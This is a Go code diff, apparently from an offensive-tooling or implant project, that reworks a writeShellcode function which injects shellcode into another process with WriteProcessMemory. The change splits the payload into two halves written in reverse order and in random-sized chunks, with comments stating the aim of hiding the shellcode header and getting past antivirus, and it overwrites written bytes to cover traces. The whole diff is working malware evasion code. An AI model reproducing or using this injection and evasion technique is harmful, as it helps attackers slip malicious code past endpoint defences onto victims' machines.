@@ -99,7 +99,7 @@ func writeShellcode(pHandle windows.Handle, shellcode []byte, memAddr uintptr, s
 	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
 	defer cancel()
 	type item struct {
-		b    byte
+		b    []byte
 		addr uintptr
 	}
 	shellcodeCh := make(chan *item, 16)
@@ -113,19 +113,52 @@ func writeShellcode(pHandle windows.Handle, shellcode []byte, memAddr uintptr, s
 				xpanic.Log(r, title)
 			}
 		}()
-		for i := uintptr(0); i < size; i++ {
-			payload := &item{
-				b:    shellcode[i],
-				addr: memAddr + i,
+
+		splitSize := len(shellcode) / 2
+
+		// secondStage first copy for hide special header
+		firstStage := shellcode[:splitSize]
+		secondStage := shellcode[splitSize:]
+
+		// first size must one byte for pass some AV
+		nextSize := 1
+		for i := 0; i < len(secondStage); {
+			if i+nextSize > len(secondStage) {
+				nextSize = len(secondStage) - i
+			}
+			item := &item{
+				b:    secondStage[i : i+nextSize],
+				addr: memAddr + uintptr(splitSize+i),
 			}
 			select {
-			case shellcodeCh <- payload:
+			case shellcodeCh <- item:
 			case <-ctx.Done():
 				return
 			}
-			// cover shellcode at once
-			shellcode[i] = byte(rand.Int64())
+
+			i += nextSize
+			nextSize = 1 + rand.Int(32)
 		}
+
+		// first stage
+		nextSize = 1
+		for i := 0; i < len(firstStage); {
+			if i+nextSize > len(firstStage) {
+				nextSize = len(firstStage) - i
+			}
+			item := &item{
+				b:    firstStage[i : i+nextSize],
+				addr: memAddr + uintptr(i),
+			}
+			select {
+			case shellcodeCh <- item:
+			case <-ctx.Done():
+				return
+			}
+			i += nextSize
+			nextSize = 1 + rand.Int(32)
+		}
+
 		close(shellcodeCh)
 	}()
 	// shellcode writer
@@ -142,11 +175,12 @@ func writeShellcode(pHandle windows.Handle, shellcode []byte, memAddr uintptr, s
 				if item == nil {
 					return
 				}
-				_, err := api.WriteProcessMemory(pHandle, item.addr, []byte{item.b})
+				_, err := api.WriteProcessMemory(pHandle, item.addr, item.b)
 				if err != nil {
+					cancel()
 					return
 				}
-				item.b = byte(rand.Int64())
+				security.CoverBytes(item.b)
 			case <-ctx.Done():
 				return
 			}
